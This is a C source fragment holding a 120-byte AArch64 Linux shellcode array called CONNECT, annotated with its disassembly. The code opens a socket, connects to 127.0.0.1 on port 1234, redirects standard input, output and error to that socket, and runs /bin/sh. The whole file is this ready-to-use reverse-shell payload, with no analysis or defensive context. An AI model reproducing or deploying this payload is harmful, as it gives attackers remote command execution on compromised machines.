// Target architecture : ARMv8/AArch64 arm
// Endian mode         : little

#define CONNECT_SIZE 120

char CONNECT[] = {
  /* 0000 */ "\xc8\x18\x80\xd2" /* movz x8, #0xc6                      */
  /* 0004 */ "\x02\x00\x80\xd2" /* movz x2, #0                         */
  /* 0008 */ "\x21\x00\x80\xd2" /* movz x1, #0x1                       */
  /* 000C */ "\x40\x00\x80\xd2" /* movz x0, #0x2                       */
  /* 0010 */ "\x01\x00\x00\xd4" /* svc  #0                             */
  /* 0014 */ "\xe3\x03\x00\x2a" /* mov  w3, w0                         */
  /* 0018 */ "\x68\x19\x80\xd2" /* movz x8, #0xcb                      */
  /* 001C */ "\x02\x02\x80\xd2" /* movz x2, #0x10                      */
  /* 0020 */ "\x41\x00\x80\xd2" /* movz x1, #0x2                       */
  /* 0024 */ "\x81\x40\xba\xf2" /* movk x1, #0xd204, lsl #16           */
  /* 0028 */ "\xe1\x0f\xc0\xf2" /* movk x1, #0x7f, lsl #32             */
  /* 002C */ "\x01\x20\xe0\xf2" /* movk x1, #0x100, lsl #48            */
  /* 0030 */ "\xe1\x0f\x1f\xf8" /* str  x1, [sp, #0xfffffffffffffff0]! */
  /* 0034 */ "\xe1\x03\x00\x91" /* mov  x1, sp                         */
  /* 0038 */ "\x01\x00\x00\xd4" /* svc  #0                             */
  /* 003C */ "\x08\x03\x80\xd2" /* movz x8, #0x18                      */
  /* 0040 */ "\x61\x00\x80\xd2" /* movz x1, #0x3                       */
  /* 0044 */ "\xe2\x03\x1f\xaa" /* mov  x2, xzr                        */
  /* 0048 */ "\xe0\x03\x03\x2a" /* mov  w0, w3                         */
  /* 004C */ "\x21\x04\x00\xf1" /* subs x1, x1, #1                     */
  /* 0050 */ "\x01\x00\x00\xd4" /* svc  #0                             */
  /* 0054 */ "\x81\xff\xff\x54" /* b.ne #0x44                          */
  /* 0058 */ "\xa8\x1b\x80\xd2" /* movz x8, #0xdd                      */
  /* 005C */ "\xe0\x45\x8c\xd2" /* movz x0, #0x622f                    */
  /* 0060 */ "\x20\xcd\xad\xf2" /* movk x0, #0x6e69, lsl #16           */
  /* 0064 */ "\xe0\x65\xce\xf2" /* movk x0, #0x732f, lsl #32           */
  /* 0068 */ "\x00\x0d\xe0\xf2" /* movk x0, #0x68, lsl #48             */
  /* 006C */ "\xe0\x03\x00\xf9" /* str  x0, [sp]                       */
  /* 0070 */ "\xe0\x03\x00\x91" /* mov  x0, sp                         */
  /* 0074 */ "\x01\x00\x00\xd4" /* svc  #0                             */
};
